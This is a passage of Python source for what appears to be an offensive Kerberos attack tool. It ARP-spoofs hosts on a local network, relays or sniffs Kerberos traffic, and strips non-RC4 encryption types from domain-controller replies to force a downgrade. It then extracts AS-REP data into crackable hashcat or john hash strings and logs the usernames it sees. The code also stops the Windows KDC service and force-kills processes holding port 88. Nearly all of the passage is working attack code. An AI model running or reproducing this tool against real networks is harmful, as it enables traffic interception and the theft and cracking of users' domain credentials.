                    rich_print_error(f'[ARP LISTEN] Error with Linux ARP method: {e}')
                    
            # Check for stop flag more frequently - break sleep into smaller chunks
            for i in range(10):  # 10 x 0.1 second = 1 second total
                if stop_arp_spoofing_flag.is_set():
                    break
                time.sleep(0.1)
                
    except KeyboardInterrupt:
        rich_print_info('[ARP LISTEN] ARP spoofing interrupted by user', 'yellow')
        stop_arp_spoofing_flag.set()
    except Exception as e:
        rich_print_error(f'[ARP LISTEN] Unexpected error in ARP spoofing: {e}')
        stop_arp_spoofing_flag.set()
    finally:
        rich_print_info(f'[ARP LISTEN] ARP spoofing stopped after {packet_count} packets', 'cyan')

def restore(poisoned_device, spoofed_ip):
    packet = ARP(op = 2, pdst = poisoned_device, psrc = spoofed_ip, hwsrc = getmacbyip(spoofed_ip)) 
    send(packet, verbose = False, count=1)

def restore_listenmode(dic_mac_addresses):
    packets_list = []
    gateway_mac = getmacbyip(gw)
    for ip_address in dic_mac_addresses :
        packets_list.append(Ether(src = hwsrc, dst=gateway_mac) / ARP(op = 2, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]))
    sendp(packets_list, iface=iface, verbose = False)

def restore_relaymode(dic_mac_addresses):
    packets_list = []
    gateway_mac = getmacbyip(gw)
    for target in dic_mac_addresses :
        packets_list.append(Ether(src = hwsrc, dst=dic_mac_addresses[target]) / ARP(op = 2, psrc = gw, hwsrc = gateway_mac))
    sendp(packets_list, iface=iface, verbose = False)

def update_uphosts():
    global Targets
    mac_addresses = get_mac_addresses(list(InitialTargets))
    new_hosts = set(mac_addresses.keys()) - Targets
    old_hosts = Targets - set(mac_addresses.keys())
    if len(old_hosts) > 0 : 
        logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
        Targets.difference_update(old_hosts)
    if len(new_hosts) > 0 :
        logging.debug(f'[*] Net probe check, adding new hosts to targets : {list(new_hosts)}')
        Targets.update(new_hosts)
    if len(new_hosts) > 0 or len(old_hosts) > 0 :
        logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')
        if Targets == set() : logging.warning(f'[!] No more target is up. Continuing probing targets...')
    return mac_addresses

def restore_all_targets():
    if mode == 'relay':
        restore_relaymode(get_mac_addresses(list(Targets)))
    elif mode == 'listen':
        restore_listenmode(get_mac_addresses(list(Targets)))

# ============================================================================
# KERBEROS PROCESSING FUNCTIONS
# ============================================================================

def print_asrep_hash(username,domain,etype,cipher):
    if HashFormat == 'hashcat':
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
        else :
            HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    else :
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
        else :
            HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    
    # Use Rich formatting for hash display
    rich_print_hash(username, domain, etype, HashToCrack)
    
    if etype == 17 and HashFormat == 'hashcat' :
        rich_print_info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32100')
    if etype == 18 and HashFormat == 'hashcat' :
        rich_print_info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32200')
    with open(outfile, 'a') as f:
        f.write(HashToCrack + '\n')

# ============================================================================
# AS-REP PROCESSING - Using working logic from listen mode
# ============================================================================

def handle_as_rep(packet):
    """
    EXACT COPY of the working Linux handle_as_rep function - uses packet.root directly
    This is the function that relay_asreq_to_dc calls in the working Linux version
    """
    global UsernamesCaptured
    
    try:
        decoder.start(bytes(packet.root.cname.nameString[0]))
        username = decoder.read()[1].decode().lower()
        decoder.start(bytes(packet.root.crealm))
        domain = decoder.read()[1].decode().lower()
        rich_print_info(f'[+] Got ASREP for username: {username}@{domain}', 'green')
        
        if username.endswith('$'):
            rich_print_info(f'[*] Machine account: {username}, skipping...', 'yellow')
            return
            
        decoder.start(bytes(packet.root.encPart.etype))
        etype = decoder.read()[1]
        decoder.start(bytes(packet.root.encPart.cipher))
        cipher = decoder.read()[1].hex()
        
        if username in UsernamesCaptured and etype in UsernamesCaptured[username]:
            rich_print_info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...', 'yellow')
            return
        else:
            if username in UsernamesCaptured:
                UsernamesCaptured[username].append(etype)
            else:
                UsernamesCaptured[username] = [etype]
        
        print_asrep_hash(username, domain, etype, cipher)
        rich_print_success(f'[RELAY] 🎯 HASH EXTRACTED FOR {username}@{domain}!')
        
    except Exception as e:
        rich_print_error(f'[AS-REP] handle_as_rep failed: {e}')
        if debug:
            import traceback
            rich_print_error(f'[AS-REP] handle_as_rep traceback: {traceback.format_exc()}')

def parse_dc_response(packet):
    """
    LINUX-COMPATIBLE VERSION: Copy exact parsing logic from working Linux version
    Enhanced with TCP session support for Windows packet reassembly
    """
    global UsernamesSeen, UsernamesCaptured, Targets, InitialTargets
    
    try:
        # LINUX METHOD: Check for TGS-REP first (exactly like Linux version)
        if packet.haslayer(KRB_TGS_REP):
            try:
                decoder.start(bytes(packet.root.cname.nameString[0]))
                username = decoder.read()[1].decode().lower()
                decoder.start(bytes(packet.root.crealm))
                domain = decoder.read()[1].decode().lower()
                if username not in UsernamesSeen and username not in UsernamesCaptured:
                    if username.endswith('$'):
                        rich_print_info(f'[+] Sniffed TGS-REP for user {username}@{domain}', 'cyan')
                    else:
                        rich_print_info(f'[+] Sniffed TGS-REP for user {username}@{domain}', 'green')
                    UsernamesSeen.add(username)
                    add_debug_message(f"TGS-REP: {username}@{domain}")
                    return
            except Exception as e:
                rich_print_warning(f'[TGS-REP] Parsing failed: {e}')
                if debug:
                    add_debug_message(f"TGS-REP parse error: {e}")

        # LINUX METHOD: Check for AS-REP (exactly like Linux version) 
        if not packet.haslayer(KRB_AS_REP):
            return

        # LINUX METHOD: Parse AS-REP using exact Linux approach
        try:
            decoder.start(bytes(packet.root.cname.nameString[0]))
            username = decoder.read()[1].decode().lower()
            decoder.start(bytes(packet.root.crealm))
            domain = decoder.read()[1].decode().lower()
            
            rich_print_info(f'[+] Got ASREP for username: {username}@{domain}', 'green')
            add_debug_message(f"AS-REP captured: {username}@{domain}")
            
            if username.endswith('$'):
                rich_print_info(f'[*] Machine account: {username}, skipping...', 'yellow')
                return
                
            decoder.start(bytes(packet.root.encPart.etype))
            etype = decoder.read()[1]
            decoder.start(bytes(packet.root.encPart.cipher))
            cipher = decoder.read()[1].hex()
            
            if username in UsernamesCaptured and etype in UsernamesCaptured[username]:
                rich_print_info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...', 'yellow')
                return
            else:
                if username in UsernamesCaptured:
                    UsernamesCaptured[username].append(etype)
                else:
                    UsernamesCaptured[username] = [etype]
            
            print_asrep_hash(username, domain, etype, cipher)
            
            if mode == 'listen' and stop_spoofing and not disable_spoofing:
                try:
                    Targets.remove(packet[IP].dst)
                    InitialTargets.remove(packet[IP].dst)
                    restore(gw, packet[IP].dst)
                    rich_print_info(f'[+] Restored arp cache of {packet[IP].dst}', 'green')
                except (KeyError, ValueError):
                    pass  # Target already removed or not in list
                    
        except Exception as e:
            rich_print_error(f'[AS-REP] Linux-method parsing failed: {e}')
            if debug:
                import traceback
                rich_print_error(f'[AS-REP] Traceback: {traceback.format_exc()}')
                add_debug_message(f"AS-REP parse error: {e}")
                
    except Exception as e:
        rich_print_error(f'[ERROR] Exception in parse_dc_response: {e}')
        if debug:
            import traceback
            rich_print_error(f'[ERROR] Traceback: {traceback.format_exc()}')
            add_debug_message(f"parse_dc_response error: {e}")

# ============================================================================
# ASYNC RELAY FUNCTIONS
# ============================================================================

async def handle_client(reader, writer):
    """Handle incoming client connections for relay mode"""
    client_ip = writer.get_extra_info('peername')[0]
    rich_print_info(f'[RELAY] New connection from {client_ip}', 'cyan')
    add_debug_message(f"Client connected: {client_ip}")

    try:
        while True:
            # CRITICAL FIX: Use Kerberos TCP length-aware reading for client data too!
            # Read the 4-byte Kerberos TCP length header first
            length_data = await asyncio.wait_for(reader.readexactly(4), timeout=5.0)
            if not length_data:
                rich_print_info(f'[RELAY] Connection closed by {client_ip}', 'blue')
                break
            
            # Parse the length (big-endian 4-byte integer)
            kerberos_length = int.from_bytes(length_data, byteorder='big')
            rich_print_info(f'[RELAY] Client {client_ip} sending {kerberos_length} byte Kerberos message', 'cyan')
            
            # Read the exact Kerberos message payload
            kerberos_data = await asyncio.wait_for(reader.readexactly(kerberos_length), timeout=5.0)
            
            # Combine length header + payload for complete Kerberos TCP message
            data = length_data + kerberos_data
            rich_print_info(f'[RELAY] Complete message: {len(data)} bytes from {client_ip}', 'blue')

            dc_response = await relay_to_dc(data, client_ip)
            if dc_response:
                writer.write(dc_response)
                await writer.drain()
            
    except ConnectionResetError:
        rich_print_info(f'[RELAY] Connection reset by {client_ip}', 'blue')
    except asyncio.TimeoutError:
        rich_print_warning(f'[RELAY] Timeout reading from {client_ip}')
    except asyncio.IncompleteReadError as e:
        rich_print_warning(f'[RELAY] Incomplete read from {client_ip}: expected {e.expected}, got {len(e.partial)}')
    except Exception as e:
        rich_print_error(f'[RELAY] Socket error from {client_ip}: {e}')

    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass  # Connection already closed

async def relay_without_modification_to_dc(data):
    """Relay data to DC without modification - Windows TCP reassembly compatible"""
    try:
        rich_print_info(f'[RELAY] Connecting to DC {dc}:88 to send {len(data)} bytes', 'blue')
        reader, writer = await asyncio.open_connection(dc, 88)
        writer.write(data)
        await writer.drain()
        rich_print_info(f'[RELAY] Data sent to DC, waiting for response...', 'blue')
        
        # Windows TCP reassembly approach - collect all segments
        response = b""
        try:
            # First read to get initial data
            initial_response = await asyncio.wait_for(reader.read(4096), timeout=5)
            if initial_response:
                response = initial_response
                rich_print_info(f'[RELAY] Initial response: {len(response)} bytes', 'green')
                
                # Check if we need to read more data (for reassembled packets)
                # Kerberos TCP has a 4-byte length header, read it to know expected size
                if len(response) >= 4:
                    expected_len = int.from_bytes(response[:4], byteorder='big')
                    actual_data_len = len(response) - 4
                    
                    rich_print_info(f'[RELAY] Expected Kerberos data: {expected_len} bytes, got: {actual_data_len} bytes', 'cyan')
                    
                    # If we haven't received all data, try to read more
                    while actual_data_len < expected_len:
                        try:
                            more_data = await asyncio.wait_for(reader.read(4096), timeout=3)
                            if more_data:
                                response += more_data
                                actual_data_len = len(response) - 4
                                rich_print_info(f'[RELAY] Accumulated {actual_data_len}/{expected_len} bytes', 'yellow')
                            else:
                                break
                        except asyncio.TimeoutError:
                            rich_print_warning(f'[RELAY] Timeout waiting for more data, using {actual_data_len} bytes')
                            break
                
                if debug and len(response) > 4:
                    rich_print_info(f'[RELAY] Final response: {len(response)} bytes, starts: {response[:20].hex()}', 'cyan')
            else:
                rich_print_warning(f'[RELAY] No response data received from DC')
        except asyncio.TimeoutError:
            rich_print_info('[RELAY] DC response timeout (normal for some requests)', 'yellow')
            response = b""
        
        writer.close()
        await writer.wait_closed()
        return response
    except Exception as e:
        rich_print_error(f'[RELAY] Error connecting to DC: {e}')
        return b""

async def relay_tgsreq_to_dc(data):
    """Handle TGS-REQ (Ticket Granting Service Request) to DC"""
    global UsernamesSeen
    response = await relay_without_modification_to_dc(data)
    
    # Process the TGS-REP response
    try:
        kerberos_packet = KerberosTCPHeader(response)
        if not kerberos_packet.haslayer(KRB_TGS_REP):
            return response
            
        # Extract username from TGS-REP for tracking (simplified)
        rich_print_info('[TGS-REP] TGS-REP response detected in relay mode', 'green')
        add_debug_message("TGS-REP detected in relay")
        # TODO: Implement proper ASN.1 parsing for username extraction
                
    except Exception as e:
        rich_print_error(f'[TGS-REP] Error processing response: {e}')
    
    return response

async def relay_asreq_to_dc(data, client_ip):
    """Handle AS-REQ (Authentication Service Request) - Core relay function from working Linux version"""
    global UsernamesCaptured, Targets, InitialTargets
    
    try:
        kerberos_packet = KerberosTCPHeader(data)
        decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
        username = decoder.read()[1].decode().lower()
        decoder.start(bytes(kerberos_packet.root.reqBody.realm))
        domain = decoder.read()[1].decode().lower()

        if username.endswith('$'):
            rich_print_info(f'[AS-REQ] Computer account {username}@{domain}, relaying without modification', 'blue')
            return await relay_without_modification_to_dc(data)

        if username in UsernamesCaptured and 23 in UsernamesCaptured[username]:
            rich_print_info(f'[AS-REQ] RC4 hash already captured for {username}@{domain}, relaying...', 'blue')
            return await relay_without_modification_to_dc(data)

        if len(kerberos_packet.root.padata) != 2:
            if ASN1_INTEGER(23) not in kerberos_packet.root.reqBody.etype:
                rich_print_warning(f'[AS-REQ] {username}@{domain} from {client_ip}: RC4 not supported by client')
                return await relay_without_modification_to_dc(data)
            
            rich_print_info(f'[AS-REQ] {username}@{domain} from {client_ip} - attempting RC4 downgrade', 'green')
            response = await relay_without_modification_to_dc(data)
            krb_response = KerberosTCPHeader(response)
            
            if not (krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19):
                return response
                
            RC4_present = False
            indexes_to_delete = []
            for idx, x in enumerate(krb_response.root.eData[0].seq[0].padataValue.seq):
                if x.etype == 0x17:
                    RC4_present = True
                else:
                    indexes_to_delete.append(idx)
            
            if not RC4_present:
                rich_print_warning('[AS-REQ] RC4 not found in DC supported algorithms - downgrade failed')
                return response
                
            rich_print_success(f'[AS-REQ] ✓ Hijacking Kerberos encryption negotiation for {username}@{domain}!')
            for i in indexes_to_delete:
                del krb_response.root.eData[0].seq[0].padataValue.seq[i]
            krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos]))
            return bytes(krb_response[KerberosTCPHeader])
    
        # Handle AS-REQ with pre-auth - look for AS-REP response (EXACT Linux method)
        rich_print_info(f'[AS-REQ] Sending request to DC for {username}@{domain}...', 'cyan')
        response = await relay_without_modification_to_dc(data)
        
        # EXACT LINUX METHOD: Parse response immediately without extra checks
        krb_response = KerberosTCPHeader(response)
        if krb_response.haslayer(KRB_AS_REP):
            rich_print_success(f'[AS-REP] ✓ Detected AS-REP for {username}@{domain}')
            handle_as_rep(krb_response)
            
            # Add stop_spoofing logic EXACTLY like Linux version
            if stop_spoofing and not disable_spoofing:
                if client_ip in Targets: 
                    Targets.remove(client_ip)
                if client_ip in InitialTargets: 
                    InitialTargets.remove(client_ip)
                restore(client_ip, gw)
                rich_print_info(f'[+] Restored arp cache of {client_ip}', 'green')
            return response
        
        return response
        
        return response
            
    except Exception as e:
        rich_print_error(f'[AS-REQ] Error processing request from {client_ip}: {e}')
        # Fallback to simple relay
        return await relay_without_modification_to_dc(data)

async def relay_to_dc(data, client_ip):
    """Route Kerberos messages to appropriate relay handlers"""
    try:
        kerberos_packet = KerberosTCPHeader(data)

        if kerberos_packet.haslayer(KRB_TGS_REQ):
            rich_print_info(f'[RELAY] TGS-REQ from {client_ip}', 'cyan')
            return await relay_tgsreq_to_dc(data)
       
        if kerberos_packet.haslayer(KRB_AS_REQ):
            rich_print_info(f'[RELAY] AS-REQ from {client_ip}', 'cyan')
            return await relay_asreq_to_dc(data, client_ip)
        
        rich_print_info(f'[RELAY] Unknown Kerberos message from {client_ip}', 'yellow')
        return await relay_without_modification_to_dc(data)
        
    except Exception as e:
        rich_print_error(f'[RELAY] Error processing data from {client_ip}: {e}')
        return await relay_without_modification_to_dc(data)

def force_clear_port_88():
    """Aggressively clear port 88 for our relay server"""
    rich_print_info('[PORT 88] Aggressively clearing port 88 for relay mode...', 'red')
    
    # Step 1: Stop Windows Kerberos service
    try:
        result = subprocess.run(['net', 'stop', 'kdc'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            rich_print_success('[PORT 88] ✓ Stopped Windows Kerberos KDC service')
        else:
            rich_print_info('[PORT 88] KDC service may not be running (normal)', 'yellow')
    except Exception as e:
        rich_print_warning(f'[PORT 88] Could not stop KDC service: {e}')
    
    # Step 2: Clear any port proxy rules
    try:
        subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
                       'listenport=88', 'listenaddress=0.0.0.0'], 
                       capture_output=True, text=True, timeout=5)
        rich_print_info('[PORT 88] Cleared port proxy rules', 'cyan')
    except Exception as e:
        rich_print_info('[PORT 88] No port proxy rules to clear', 'blue')
    
    # Step 3: Kill any processes using port 88
    try:
        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
        lines = result.stdout.split('\n')
        for line in lines:
            if ':88 ' in line and 'LISTENING' in line:
                parts = line.split()
                if len(parts) > 4:
                    pid = parts[-1]
                    rich_print_warning(f'[PORT 88] Found process {pid} using port 88, attempting to terminate')
                    try:
                        subprocess.run(['taskkill', '/F', '/PID', pid], capture_output=True, text=True, timeout=5)
                        rich_print_success(f'[PORT 88] ✓ Terminated process {pid}')
                    except:
                        rich_print_warning(f'[PORT 88] Could not terminate process {pid}')
    except Exception as e:
        rich_print_info('[PORT 88] Could not check/clear port usage', 'blue')
    
    # Give Windows time to release the port
    time.sleep(2)
    rich_print_success('[PORT 88] Port 88 cleanup completed')

async def kerberos_server():
    """Start the Kerberos relay server - MUST bind to port 88 for ARP spoofing"""
    global relay_port, skip_redirection
    
    max_attempts = 3
    attempt = 1
    
    while attempt <= max_attempts:
        try:
            rich_print_info(f'[RELAY] Initializing Kerberos relay server for port 88 (attempt {attempt}/{max_attempts})...', 'green')
            
            # CRITICAL: Force clear port 88 for relay mode
            force_clear_port_88()
            
            # RELAY MODE REQUIREMENT: Must bind to port 88 for ARP spoofing to work
            server_port = 88
            rich_print_warning('[RELAY] CRITICAL: Binding to port 88 (required for ARP spoofing)')
            
            # Test port 88 availability after cleanup with retries
            test_socket = None
            port_available = False
            
            for test_attempt in range(3):
                try:
                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    test_socket.bind(('0.0.0.0', 88))
                    test_socket.close()
                    port_available = True
                    rich_print_success('[RELAY] ✓ Port 88 is now available for binding!')
                    break
                except OSError as e:
                    if test_socket:
                        test_socket.close()
                    if test_attempt < 2:  # Not the last attempt
                        rich_print_info(f'[RELAY] Port 88 still busy (attempt {test_attempt + 1}/3), waiting...', 'yellow')
                        time.sleep(3)  # Wait longer for Windows to release port
                    else:
                        rich_print_error(f'[RELAY] FAILED: Port 88 still in use after {test_attempt + 1} attempts: {e}')
                        raise e
            
            if not port_available:
                raise Exception("Port 88 unavailable after multiple attempts")
            
            # Start the relay server directly on port 88
            rich_print_info('[RELAY] Starting Kerberos relay server on port 88...', 'green')
            add_debug_message("Starting relay server on port 88")
            
            # Enhanced server creation with proper error handling
            try:
                server = await asyncio.start_server(handle_client, '0.0.0.0', 88)
                rich_print_success('[RELAY] ✓ Kerberos relay server bound to port 88!')
                rich_print_success('[RELAY] ✓ ARP spoofed traffic will now flow directly to our relay!')
                
                add_debug_message("Relay server ready on port 88")
                
                async with server:
                    await server.serve_forever()
                    
            except OSError as bind_error:
                rich_print_error(f'[RELAY] Failed to bind to port 88: {bind_error}')
                if "Address already in use" in str(bind_error):
                    rich_print_warning('[RELAY] Port 88 was taken between test and bind')
                    if attempt < max_attempts:
                        rich_print_info(f'[RELAY] Retrying in 5 seconds... (attempt {attempt + 1}/{max_attempts})', 'yellow')
                        time.sleep(5)
                        attempt += 1
                        continue
                raise bind_error
                
            # If we get here, server started successfully
            break
            
        except Exception as e:
            rich_print_error(f'[RELAY] Failed to start server (attempt {attempt}/{max_attempts}): {e}')
            if attempt < max_attempts:
                rich_print_info(f'[RELAY] Will retry in 10 seconds...', 'yellow')
                time.sleep(10)
                attempt += 1
            else:
                rich_print_error('[RELAY] All binding attempts failed!')
                rich_print_error('[RELAY] Manual intervention required:')
                rich_print_info('[RELAY]   1. Check services: services.msc', 'yellow')
                rich_print_info('[RELAY]   2. Stop "Kerberos Key Distribution Center"', 'yellow')
                rich_print_info('[RELAY]   3. Check processes: netstat -ano | findstr :88', 'yellow')
                rich_print_info('[RELAY]   4. Kill conflicting processes: taskkill /F /PID <pid>', 'yellow')
                rich_print_info('[RELAY]   5. Restart script as administrator', 'yellow')
                raise e
        # Provide helpful diagnostics
        try:
            result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
            lines = result.stdout.split('\n')
            port_88_lines = [line for line in lines if ':88 ' in line and 'LISTENING' in line]
            if port_88_lines:
                rich_print_info('[RELAY] Processes currently using port 88:', 'yellow')
                for line in port_88_lines[:2]:
                    rich_print_info(f'[RELAY] {line.strip()}', 'white')
        except Exception:
            pass
        raise

# ============================================================================
# MODE FUNCTIONS
# ============================================================================

def listen_mode():
    global AllUsernames
    
    # RESET the stop flag to ensure clean start - this fixes early exit issue
    stop_arp_spoofing_flag.clear()
    rich_print_info('[LISTEN] Reset stop flag - ensuring clean startup', 'cyan')
    
    try :
        # Start ARP spoofing in background (if enabled)
        if not disable_spoofing:
            thread = threading.Thread(target=listenmode_arp_spoof)
            thread.daemon = True
            thread.start()
            rich_print_info('[+] ARP spoofing started in background', 'green')
        
        # SIMPLIFIED: Use basic port 88 filter like the working Linux version
        rich_print_info('[LISTEN] Starting packet capture - LINUX ARP METHOD...', 'green')
        rich_print_info('[LISTEN] Filter: "src port 88" (same as working Linux version)', 'cyan')
        rich_print_info(f'[LISTEN] Targets: {list(Targets)}, Gateway: {gw}', 'cyan')
        rich_print_info('[LISTEN] ARP METHOD: Batch poisoning gateway cache (Linux approach)', 'yellow')
        
        # Note about ICMP redirects - these are normal and expected
        rich_print_warning('[LISTEN] NOTE: ICMP redirects are normal during ARP spoofing')
        rich_print_warning('[LISTEN] They indicate network is responding to our ARP poisoning')
        rich_print_warning('[LISTEN] Not a problem - shows routing is being affected as intended')
        
        # Windows-specific: Enable promiscuous mode to capture redirected packets + TCP sessions
        rich_print_info('[LISTEN] Using Windows promiscuous mode with TCP session support', 'yellow')
        rich_print_info('[LISTEN] TCP sessions enable proper packet reassembly for Kerberos', 'yellow')
        rich_print_info('[LISTEN] Press Ctrl+C to stop packet capture...', 'cyan')
        
        # CRITICAL: Try to import TCPSession for proper packet reassembly on Windows
        try:
            from scapy.sessions import TCPSession
            tcp_session_available = True
            rich_print_success('[TCP SESSION] TCP session support available - enables packet reassembly')
        except ImportError:
            tcp_session_available = False
            rich_print_warning('[TCP SESSION] TCP session support not available - using basic mode')
        
        # Enhanced loop with longer capture sessions and better error handling
        rich_print_info('[LISTEN] Starting continuous packet capture loop...', 'green')
        
        capture_round = 0
        while not stop_arp_spoofing_flag.is_set():
            try:
                capture_round += 1
                if debug:
                    rich_print_info(f'[LISTEN] Capture round {capture_round} starting', 'cyan')
                
                # Use longer capture sessions to reduce loop overhead
                if tcp_session_available:
                    # Use TCPSession for proper TCP reassembly (critical for Kerberos over TCP)
                    sniff(
                        filter="src port 88", 
                        prn=parse_dc_response, 
                        iface=iface, 
                        store=False, 
                        promisc=True, 
                        session=TCPSession,  # CRITICAL: TCP packet reassembly
                        count=50,  # Increased from 10 to reduce loop frequency
                        timeout=10  # Increased from 2 to reduce CPU usage
                    )
                else:
                    # Fallback without TCP session
                    sniff(
                        filter="src port 88", 
                        prn=parse_dc_response, 
                        iface=iface, 
                        store=False, 
                        promisc=True, 
                        count=50,  # Increased from 10
                        timeout=10  # Increased from 2
                    )
                
                # Add small sleep to prevent tight loop if sniff returns immediately
                if not stop_arp_spoofing_flag.is_set():
                    time.sleep(0.1)
                    
            except KeyboardInterrupt:
                rich_print_info('[LISTEN] Keyboard interrupt in capture loop', 'yellow')
                break
            except Exception as sniff_e:
                if "timeout" not in str(sniff_e).lower():
                    rich_print_warning(f'[LISTEN] Sniff exception (round {capture_round}): {sniff_e}')
                    if debug:
                        import traceback
                        rich_print_info(f'[LISTEN DEBUG] Exception details: {traceback.format_exc()}', 'cyan')
                # Continue the loop regardless - don't let exceptions stop listening
                time.sleep(0.5)  # Brief pause on error
        
    except KeyboardInterrupt:
        rich_print_info('\n[LISTEN] Packet capture stopped by user', 'yellow')
        stop_arp_spoofing_flag.set()  # Ensure ARP spoofing stops
    except Exception as e:
        rich_print_error(f'[LISTEN] Error in listen mode: {e}')
        if debug:
            import traceback
            rich_print_info(f'[LISTEN DEBUG] Full traceback: {traceback.format_exc()}', 'cyan')
    finally :
        console.print()  # Add newline
        
        # Use centralized cleanup
        cleanup_all()
        
        # Save captured usernames and hashes
        AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
        if AllUsernames != set() :
            with open(usersfile, 'w') as f :
                f.write('\n'.join(list(AllUsernames)) + '\n')
            rich_print_success(f'Listed seen usernames in file {usersfile}')
        if UsernamesCaptured != {} :
            rich_print_success(f'Listed hashes in file {outfile}')

def relay_mode():
    global AllUsernames
    
    # RESET the stop flag to ensure clean start - this fixes early exit issue
    stop_arp_spoofing_flag.clear()
    rich_print_info('[RELAY] Reset stop flag - ensuring clean startup', 'cyan')
    
    try:
        # Start ARP spoofing in background (if enabled)
        if not disable_spoofing:
            thread = threading.Thread(target=relaymode_arp_spoof, args=(dc,))
            thread.daemon = True
            thread.start()
            rich_print_info('[+] ARP spoofing started in background', 'green')
        
        # CRITICAL: Try to import TCPSession for proper packet reassembly on Windows
        try:
            from scapy.sessions import TCPSession
            tcp_session_available = True
            rich_print_success('[TCP SESSION] TCP session support available - enables packet reassembly')
        except ImportError:
            tcp_session_available = False
            rich_print_warning('[TCP SESSION] TCP session support not available - using basic mode')
        
        # Create a threading event to signal when to stop the sniffer
        stop_sniffer = threading.Event()
        
        # Start packet sniffer in a separate thread
        def run_sniffer():
            rich_print_info('[RELAY] Starting parallel packet sniffer with TCP session support', 'green')
            rich_print_info('[RELAY] This will capture and reassemble multi-segment Kerberos packets', 'yellow')
            
            try:
                while not stop_sniffer.is_set():
                    try:
                        if tcp_session_available:
                            # Use TCPSession for proper TCP reassembly (critical for Kerberos over TCP)
                            sniff(
                                filter="src port 88", 
                                prn=parse_dc_response, 
                                iface=iface, 
                                store=False, 
                                promisc=True, 
                                session=TCPSession,  # CRITICAL: TCP packet reassembly
                                count=50,  # Increased from 10 to reduce loop frequency
                                timeout=10  # Increased from 2 to reduce CPU usage
                            )
                        else:
                            # Fallback without TCP session
                            sniff(
                                filter="src port 88", 
                                prn=parse_dc_response, 
                                iface=iface, 
                                store=False, 
                                promisc=True, 
                                count=50,  # Increased from 10
                                timeout=10  # Increased from 2
                            )
                        
                        # Add small sleep to prevent tight loop if sniff returns immediately
                        if not stop_sniffer.is_set():
                            time.sleep(0.1)
                            
                    except KeyboardInterrupt:
                        break
                    except Exception as sniff_e:
                        if "timeout" not in str(sniff_e).lower():
                            rich_print_warning(f'[RELAY] Sniff exception: {sniff_e}')
                            if debug:
                                import traceback
                                rich_print_info(f'[RELAY DEBUG] Exception details: {traceback.format_exc()}', 'cyan')
                        # Continue the loop regardless - don't let exceptions stop listening
                        time.sleep(0.5)  # Brief pause on error
            except Exception as e:
                rich_print_error(f'[RELAY] Error in packet sniffer: {e}')
        
        # Start the sniffer thread
        sniffer_thread = threading.Thread(target=run_sniffer)
        sniffer_thread.daemon = True
        sniffer_thread.start()
        rich_print_success('[RELAY] Parallel packet sniffer started successfully!')
        
        # Run the Kerberos relay server in the main thread
        asyncio.run(kerberos_server())
        
    except KeyboardInterrupt:
        rich_print_info('\n[RELAY] Relay mode stopped by user', 'yellow')
        stop_arp_spoofing_flag.set()  # Ensure ARP spoofing stops
        if 'stop_sniffer' in locals():
            stop_sniffer.set()  # Signal sniffer thread to stop
    except Exception as e:
        rich_print_error(f'[RELAY] Error in relay mode: {e}')
        if debug:
            import traceback
            rich_print_info(f'[RELAY DEBUG] Full traceback: {traceback.format_exc()}', 'cyan')
    finally:
        console.print()  # Add newline
        
        # Stop sniffer if it's running
        if 'stop_sniffer' in locals():
            stop_sniffer.set()
        
        # Use centralized cleanup
        cleanup_all()
        
        # Save captured usernames and hashes
        AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
        if AllUsernames != set() :
            with open(usersfile, 'w') as f :
                f.write('\n'.join(list(AllUsernames)) + '\n')
            rich_print_success(f'Listed seen usernames in file {usersfile}')
        if UsernamesCaptured != {} :
            rich_print_success(f'Listed hashes in file {outfile}')

# ============================================================================
# MAIN FUNCTION
# ============================================================================

def main():
    # Set up signal handlers for graceful cleanup IMMEDIATELY
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Register cleanup function to run on normal exit
    atexit.register(cleanup_all)
    
    # Initialize Rich console first
    global setup_complete
    setup_complete = False
    
    # Confirm Kerberos layer availability
    rich_print_success('[IMPORT] ✓ Scapy Kerberos layers loaded')
    
    global mode, outfile, usersfile, HashFormat, iface, disable_spoofing, stop_spoofing
    global gw, dc, debug, hwsrc, Targets, InitialTargets, TargetsList
    global UsernamesCaptured, UsernamesSeen, AllUsernames, firewall_backup_file, original_ip_forward
    global relay_port, skip_redirection
    
    display_banner()

    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Clients are forced to use RC4 if supported.\n"
                                                                                    "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
    parser.add_argument('-outfile', action='store', help='Output file name to write hashes to crack.')
    parser.add_argument('-usersfile', action='store', help='Output file name to write discovered usernames.')
    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat.')
    parser.add_argument('-debug', action='store_true', default=False, help='Increase verbosity.')
    group = parser.add_argument_group('ARP poisoning')
